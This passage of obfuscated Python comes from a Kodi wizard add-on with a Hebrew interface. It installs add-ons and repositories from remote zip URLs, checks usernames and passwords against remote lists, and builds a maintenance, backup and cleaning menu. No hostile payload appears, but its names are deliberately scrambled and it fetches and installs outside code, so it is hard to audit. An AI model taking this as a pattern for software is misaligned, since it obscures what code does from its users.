			O00OOO0OOO0O0OO0O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0O0O0O0O00OO0000 ).findall (OOO00OO0OOO0O00O0 )#line:2528
			if len (O00OOO0OOO0O0OO0O )>0 :#line:2529
				for OOOO0O0O000OOOO00 ,OOO0O00OO00OOOO00 ,OOO0OO0OOO0OO0OO0 ,O0OOO0000OO0O00O0 ,O0000OO000OO00O00 ,OO00OO00OOOO0O00O ,OO0OO0O000OO0OO0O ,O00OOOO0O0O0OO00O ,OO0O0OO00O0O0OOOO in O00OOO0OOO0O0OO0O :#line:2530
					if os .path .exists (os .path .join (ADDONS ,O0O0O0O0O00OO0000 )):#line:2531
						O0000OOO00O00O00O =['Launch Addon','Remove Addon']#line:2532
						O0000O0000OO00OO0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0000OOO00O00O00O )#line:2533
						if O0000O0000OO00OO0 ==0 :#line:2534
							wiz .ebi ('RunAddon(%s)'%O0O0O0O0O00OO0000 )#line:2535
							xbmc .sleep (1000 )#line:2536
							return True #line:2537
						elif O0000O0000OO00OO0 ==1 :#line:2538
							wiz .cleanHouse (os .path .join (ADDONS ,O0O0O0O0O00OO0000 ))#line:2539
							try :wiz .removeFolder (os .path .join (ADDONS ,O0O0O0O0O00OO0000 ))#line:2540
							except :pass #line:2541
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O0O0O0O00OO0000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2542
								removeAddonData (O0O0O0O0O00OO0000 )#line:2543
							wiz .refresh ()#line:2544
							return True #line:2545
						else :#line:2546
							return False #line:2547
					O000000O0O000O000 =os .path .join (ADDONS ,OOO0OO0OOO0OO0OO0 )#line:2548
					if not OOO0OO0OOO0OO0OO0 .lower ()=='none'and not os .path .exists (O000000O0O000O000 ):#line:2549
						wiz .log ("Repository not installed, installing it")#line:2550
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0O0O0O0O00OO0000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO0OO0OOO0OO0OO0 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2551
							O00000O0O0O000000 =wiz .parseDOM (wiz .openURL (O0OOO0000OO0O00O0 ),'addon',ret ='version',attrs ={'id':OOO0OO0OOO0OO0OO0 })#line:2552
							if len (O00000O0O0O000000 )>0 :#line:2553
								OO0000O000OOO0OO0 ='%s%s-%s.zip'%(O0000OO000OO00O00 ,OOO0OO0OOO0OO0OO0 ,O00000O0O0O000000 [0 ])#line:2554
								wiz .log (OO0000O000OOO0OO0 )#line:2555
								if KODIV >=17 :wiz .addonDatabase (OOO0OO0OOO0OO0OO0 ,1 )#line:2556
								installAddon (OOO0OO0OOO0OO0OO0 ,OO0000O000OOO0OO0 )#line:2557
								wiz .ebi ('UpdateAddonRepos()')#line:2558
								wiz .log ("Installing Addon from Kodi")#line:2560
								O0O00OOOO0O0OOOO0 =installFromKodi (O0O0O0O0O00OO0000 )#line:2561
								wiz .log ("Install from Kodi: %s"%O0O00OOOO0O0OOOO0 )#line:2562
								if O0O00OOOO0O0OOOO0 :#line:2563
									wiz .refresh ()#line:2564
									return True #line:2565
							else :#line:2566
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOO0OO0OOO0OO0OO0 )#line:2567
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0O0O0O0O00OO0000 ,OOO0OO0OOO0OO0OO0 ))#line:2568
					elif OOO0OO0OOO0OO0OO0 .lower ()=='none':#line:2569
						wiz .log ("No repository, installing addon")#line:2570
						OO0O0O000O0O000OO =O0O0O0O0O00OO0000 #line:2571
						OO000OO0O0OOOO0O0 =OOO0O00OO00OOOO00 #line:2572
						installAddon (O0O0O0O0O00OO0000 ,OOO0O00OO00OOOO00 )#line:2573
						wiz .refresh ()#line:2574
						return True #line:2575
					else :#line:2576
						wiz .log ("Repository installed, installing addon")#line:2577
						O0O00OOOO0O0OOOO0 =installFromKodi (O0O0O0O0O00OO0000 ,False )#line:2578
						if O0O00OOOO0O0OOOO0 :#line:2579
							wiz .refresh ()#line:2580
							return True #line:2581
					if os .path .exists (os .path .join (ADDONS ,O0O0O0O0O00OO0000 )):return True #line:2582
					OOOOOOO0OO0OOO00O =wiz .parseDOM (wiz .openURL (O0OOO0000OO0O00O0 ),'addon',ret ='version',attrs ={'id':O0O0O0O0O00OO0000 })#line:2583
					if len (OOOOOOO0OO0OOO00O )>0 :#line:2584
						OOO0O00OO00OOOO00 ="%s%s-%s.zip"%(OOO0O00OO00OOOO00 ,O0O0O0O0O00OO0000 ,OOOOOOO0OO0OOO00O [0 ])#line:2585
						wiz .log (str (OOO0O00OO00OOOO00 ))#line:2586
						if KODIV >=17 :wiz .addonDatabase (O0O0O0O0O00OO0000 ,1 )#line:2587
						installAddon (O0O0O0O0O00OO0000 ,OOO0O00OO00OOOO00 )#line:2588
						wiz .refresh ()#line:2589
					else :#line:2590
						wiz .log ("no match");return False #line:2591
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2592
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O0OO000OOO0OO0O )#line:2593
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2594
def installFromKodi (OO0O0OO0000OOO0OO ,over =True ):#line:2596
	if over ==True :#line:2597
		xbmc .sleep (2000 )#line:2598
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0O0OO0000OOO0OO )#line:2600
	if not wiz .whileWindow ('yesnodialog'):#line:2601
		return False #line:2602
	xbmc .sleep (1000 )#line:2603
	if wiz .whileWindow ('okdialog'):#line:2604
		return False #line:2605
	wiz .whileWindow ('progressdialog')#line:2606
	if os .path .exists (os .path .join (ADDONS ,OO0O0OO0000OOO0OO )):return True #line:2607
	else :return False #line:2608
def installAddon (OO0OO000000O0O0OO ,OOOO0OO000OO0O000 ):#line:2610
	if not wiz .workingURL (OOOO0OO000OO0O000 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0OO000000O0O0OO ,COLOR2 ));return #line:2611
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2612
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO000000O0O0OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2613
	OOO0OO00000OO00OO =OOOO0OO000OO0O000 .split ('/')#line:2614
	OOO0O00O00OOOOOO0 =os .path .join (PACKAGES ,OOO0OO00000OO00OO [-1 ])#line:2615
	try :os .remove (OOO0O00O00OOOOOO0 )#line:2616
	except :pass #line:2617
	downloader .download (OOOO0OO000OO0O000 ,OOO0O00O00OOOOOO0 ,DP )#line:2618
	O00OO0OO0OOOO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO000000O0O0OO )#line:2619
	DP .update (0 ,O00OO0OO0OOOO000O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2620
	OOO000O000OOOO000 ,OOOO0O0000OOO0000 ,OO00OO00OO0O00O0O =extract .all (OOO0O00O00OOOOOO0 ,ADDONS ,DP ,title =O00OO0OO0OOOO000O )#line:2621
	DP .update (0 ,O00OO0OO0OOOO000O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2622
	installed (OO0OO000000O0O0OO )#line:2623
	installDep (OO0OO000000O0O0OO ,DP )#line:2624
	DP .close ()#line:2625
	wiz .ebi ('UpdateAddonRepos()')#line:2626
	wiz .ebi ('UpdateLocalAddons()')#line:2627
	wiz .refresh ()#line:2628
def installDep (O00O0OO0O0O000O0O ,DP =None ):#line:2630
	O0000OO00O0OO0000 =os .path .join (ADDONS ,O00O0OO0O0O000O0O ,'addon.xml')#line:2631
	if os .path .exists (O0000OO00O0OO0000 ):#line:2632
		OOOOOOO0000000OO0 =open (O0000OO00O0OO0000 ,mode ='r');OOOOO0OOO0000O00O =OOOOOOO0000000OO0 .read ();OOOOOOO0000000OO0 .close ();#line:2633
		OOO0000O0O0OOOOO0 =wiz .parseDOM (OOOOO0OOO0000O00O ,'import',ret ='addon')#line:2634
		for O000000O00OOOO000 in OOO0000O0O0OOOOO0 :#line:2635
			if not 'xbmc.python'in O000000O00OOOO000 :#line:2636
				if not DP ==None :#line:2637
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000000O00OOOO000 ))#line:2638
				wiz .createTemp (O000000O00OOOO000 )#line:2639
def installed (OOOO00000OOO000O0 ):#line:2666
	OOO000O000OOOOO00 =os .path .join (ADDONS ,OOOO00000OOO000O0 ,'addon.xml')#line:2667
	if os .path .exists (OOO000O000OOOOO00 ):#line:2668
		try :#line:2669
			O0OO00O0OO0OOOOO0 =open (OOO000O000OOOOO00 ,mode ='r');O000O0O00OOO0OOOO =O0OO00O0OO0OOOOO0 .read ();O0OO00O0OO0OOOOO0 .close ()#line:2670
			OO00O000OO00OO0O0 =wiz .parseDOM (O000O0O00OOO0OOOO ,'addon',ret ='name',attrs ={'id':OOOO00000OOO000O0 })#line:2671
			OO0000O0OO0O0000O =os .path .join (ADDONS ,OOOO00000OOO000O0 ,'icon.png')#line:2672
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O000OO00OO0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0000O0OO0O0000O )#line:2673
		except :pass #line:2674
def youtubeMenu (url =None ):#line:2676
	if not YOUTUBEFILE =='http://':#line:2677
		if url ==None :#line:2678
			OO00000O00OOOOOOO =wiz .workingURL (YOUTUBEFILE )#line:2679
			OO000O0OO0000O000 =uservar .YOUTUBEFILE #line:2680
		else :#line:2681
			OO00000O00OOOOOOO =wiz .workingURL (url )#line:2682
			OO000O0OO0000O000 =url #line:2683
		if OO00000O00OOOOOOO ==True :#line:2684
			OO00O0O00O00O0O0O =wiz .openURL (OO000O0OO0000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2685
			O0OOO0O0O00OOO0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO00O0O00O00O0O0O )#line:2686
			if len (O0OOO0O0O00OOO0O0 )>0 :#line:2687
				for O0OO0OOO0O00OO0OO ,O0O0000O0OOO00OO0 ,url ,O00OOO000OOO00OO0 ,O00OO0O00OOOOO0OO ,O0OOOO000OOOOOO0O in O0OOO0O0O00OOO0O0 :#line:2688
					if O0O0000O0OOO00OO0 .lower ()=="yes":#line:2689
						addDir ("[B]%s[/B]"%O0OO0OOO0O00OO0OO ,'youtube',url ,description =O0OOOO000OOOOOO0O ,icon =O00OOO000OOO00OO0 ,fanart =O00OO0O00OOOOO0OO ,themeit =THEME3 )#line:2690
					else :#line:2691
						addFile (O0OO0OOO0O00OO0OO ,'viewVideo',url =url ,description =O0OOOO000OOOOOO0O ,icon =O00OOO000OOO00OO0 ,fanart =O00OO0O00OOOOO0OO ,themeit =THEME2 )#line:2692
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2693
		else :#line:2694
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2695
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2696
			addFile ('%s'%OO00000O00OOOOOOO ,'',themeit =THEME3 )#line:2697
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2698
	setView ('files','viewType')#line:2699
def STARTP ():#line:2700
	OOO0O00O0OOO00000 =(ADDON .getSetting ("pass"))#line:2701
	if BUILDNAME =="":#line:2702
	 if not NOTIFY =='true':#line:2703
          O0O00OO00OO00OO0O =wiz .workingURL (NOTIFICATION )#line:2704
	 if not NOTIFY2 =='true':#line:2705
          O0O00OO00OO00OO0O =wiz .workingURL (NOTIFICATION2 )#line:2706
	 if not NOTIFY3 =='true':#line:2707
          O0O00OO00OO00OO0O =wiz .workingURL (NOTIFICATION3 )#line:2708
	OOOO0000OOOO0OOO0 =OOO0O00O0OOO00000 #line:2709
	O0O00OO00OO00OO0O =urllib2 .Request (SPEED )#line:2710
	O00OO0OOOO0O0O000 =urllib2 .urlopen (O0O00OO00OO00OO0O )#line:2711
	OOOOOO0O0O00OOOO0 =O00OO0OOOO0O0O000 .readlines ()#line:2713
	OO000000O0OO0O00O =0 #line:2717
	for OOO00000O000O00OO in OOOOOO0O0O00OOOO0 :#line:2718
		if OOO00000O000O00OO .split (' ==')[0 ]==OOO0O00O0OOO00000 or OOO00000O000O00OO .split ()[0 ]==OOO0O00O0OOO00000 :#line:2719
			OO000000O0OO0O00O =1 #line:2720
			break #line:2721
	if OO000000O0OO0O00O ==0 :#line:2722
					O0OOO000000OOO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2723
					if O0OOO000000OOO0O0 :#line:2725
						ADDON .openSettings ()#line:2727
						sys .exit ()#line:2729
					else :#line:2730
						sys .exit ()#line:2731
	return 'ok'#line:2735
def STARTP2 ():#line:2736
	OO0O00O00OOO00OOO =(ADDON .getSetting ("user"))#line:2737
	OOOO0O0O00000O0OO =(UNAME )#line:2739
	OOOOO0O0OO0OO0OO0 =urllib2 .urlopen (OOOO0O0O00000O0OO )#line:2740
	OOOOOO0OOOOO00O00 =OOOOO0O0OO0OO0OO0 .readlines ()#line:2741
	O00O00OO000000OO0 =0 #line:2742
	for O0O00O00OO000000O in OOOOOO0OOOOO00O00 :#line:2745
		if O0O00O00OO000000O .split (' ==')[0 ]==OO0O00O00OOO00OOO or O0O00O00OO000000O .split ()[0 ]==OO0O00O00OOO00OOO :#line:2746
			O00O00OO000000OO0 =1 #line:2747
			break #line:2748
	if O00O00OO000000OO0 ==0 :#line:2749
		O0O0O0OOO0000OOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2750
		if O0O0O0OOO0000OOOO :#line:2752
			ADDON .openSettings ()#line:2754
			sys .exit ()#line:2757
		else :#line:2758
			sys .exit ()#line:2759
	return 'ok'#line:2763
def passandpin ():#line:2764
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2765
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2766
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2767
def passandUsername ():#line:2768
	ADDON .openSettings ()#line:2770
def folderback ():#line:2773
    O0OOOOOOO00OO00OO =ADDON .getSetting ("path")#line:2774
    if O0OOOOOOO00OO00OO :#line:2775
      O0OOOOOOO00OO00OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2776
      ADDON .setSetting ("path",O0OOOOOOO00OO00OO )#line:2777
def backmyupbuild ():#line:2780
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2786
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2788
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2789
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2790
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2792
def maintMenu (view =None ):#line:2796
	O00OO0OO0OO0O0000 ='[B][COLOR green]ON[/COLOR][/B]';OO0O0O000OO0000OO ='[B][COLOR red]OFF[/COLOR][/B]'#line:2798
	O0000OO0OOO0O0O0O ='true'if AUTOCLEANUP =='true'else 'false'#line:2799
	O00O0OOOOO0000OOO ='true'if AUTOCACHE =='true'else 'false'#line:2800
	O00O0O0OO000OOOO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2801
	OOOO0O00OO0OOOOO0 ='true'if AUTOTHUMBS =='true'else 'false'#line:2802
	OOO0OOOO000O0000O ='true'if SHOWMAINT =='true'else 'false'#line:2803
	O00O0000OO0O00O00 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2804
	O000OO0OO0OOO0000 ='true'if INCLUDEALL =='true'else 'false'#line:2805
	O000OO0OO0O00OO00 ='true'if THIRDPARTY =='true'else 'false'#line:2806
	if wiz .Grab_Log (True )==False :OO00000OOOOOOO000 =0 #line:2807
	else :OO00000OOOOOOO000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2808
	if wiz .Grab_Log (True ,True )==False :OOOO00O0O0OOO0000 =0 #line:2809
	else :OOOO00O0O0OOO0000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2810
	OO0O00OOO0OOOOO0O =int (OO00000OOOOOOO000 )+int (OOOO00O0O0OOO0000 )#line:2811
	OOOO000O00O0O0OO0 =str (OO0O00OOO0OOOOO0O )+' Error(s) Found'if OO0O00OOO0OOOOO0O >0 else 'None Found'#line:2812
	OO0O0000OO0O00OO0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2813
	if O000OO0OO0OOO0000 =='true':#line:2814
		O000000O0OO000O0O ='true'#line:2815
		OOOOOO0OOO00O00OO ='true'#line:2816
		OO0000OO0O0O0OO0O ='true'#line:2817
		OO0O0OO00O00000OO ='true'#line:2818
		O0000OOO0O000OOOO ='true'#line:2819
		O00O0O0000O0OO0OO ='true'#line:2820
		O000O000OOO0OOO00 ='true'#line:2821
		O0OO0OO0O0O00OOO0 ='true'#line:2822
	else :#line:2823
		O000000O0OO000O0O ='true'if INCLUDEBOB =='true'else 'false'#line:2824
		OOOOOO0OOO00O00OO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2825
		OO0000OO0O0O0OO0O ='true'if INCLUDESPECTO =='true'else 'false'#line:2826
		OO0O0OO00O00000OO ='true'if INCLUDEGENESIS =='true'else 'false'#line:2827
		O0000OOO0O000OOOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2828
		O00O0O0000O0OO0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2829
		O000O000OOO0OOO00 ='true'if INCLUDESALTS =='true'else 'false'#line:2830
		O0OO0OO0O0O00OOO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2831
	OOOOOOOOO00O00OO0 =wiz .getSize (PACKAGES )#line:2832
	OOOOOO000O0OO00OO =wiz .getSize (THUMBS )#line:2833
	OOO0OOOO0O0000O00 =wiz .getCacheSize ()#line:2834
	OO000OOO000O00O00 =OOOOOOOOO00O00OO0 +OOOOOO000O0OO00OO +OOO0OOOO0O0000O00 #line:2835
	OOOOOOOOO0OO00OOO =['Daily','Always','3 Days','Weekly']#line:2836
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2837
	if view =="clean"or SHOWMAINT =='true':#line:2838
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO000OOO000O00O00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OOOO0O0000O00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOOOOO00O00OO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOO000O0OO00OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2846
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2847
	if view =="addon"or SHOWMAINT =='false':#line:2848
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2855
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2856
	if view =="misc"or SHOWMAINT =='true':#line:2857
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('View Errors in Log: %s'%(OOOO000O00O0O0OO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2864
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2865
		addFile ('Clear Wizard Log File%s'%OO0O0000OO0O00OO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2866
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2867
	if view =="backup"or SHOWMAINT =='true':#line:2868
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2874
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2875
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2876
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2877
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2878
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2879
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2880
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2881
	if view =="tweaks"or SHOWMAINT =='true':#line:2882
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2883
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2884
		else :#line:2885
			if os .path .exists (ADVANCED ):#line:2886
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2887
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2888
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2889
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2890
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2891
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2892
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2893
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2894
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2895
	addFile ('Show All Maintenance: %s'%OOO0OOOO000O0000O .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2896
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2897
	addFile ('Third Party Wizards: %s'%O000OO0OO0O00OO00 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2898
	if O000OO0OO0O00OO00 =='true':#line:2899
		OO00OO0OO00OOO0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2900
		OO000OOOOOO00OO00 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2901
		OO00O0000OO0O000O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2902
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00OO0OO00OOO0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000OOOOOO00OO00 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO00O0000OO0O000O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2906
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0000OO0OOO0O0O0O .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2907
	if O0000OO0OOO0O0O0O =='true':#line:2908
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOOOOOOO0OO00OOO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00O0OOOOO0000OOO .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O00O0O0OO000OOOO0 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOO0O00OO0OOOOO0 .replace ('true',O00OO0OO0OO0O0000 ).replace ('false',OO0O0O000OO0000OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2912
